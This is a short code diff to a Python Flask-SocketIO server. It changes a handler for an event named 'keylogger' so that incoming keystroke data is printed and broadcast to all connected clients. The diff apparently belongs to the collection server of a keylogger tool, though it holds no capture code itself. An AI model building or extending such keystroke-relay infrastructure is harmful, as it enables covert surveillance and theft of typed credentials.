@@ -17,8 +17,8 @@ def message(data):
 
 @socketio.on('keylogger')
 def test_connect(data):
-    print(data["keylogged"])
-    send(data)
+    print(data)
+    socketio.emit('keylogger', data)
 
 
 print(int(os.environ.get('PORT', 5000)))
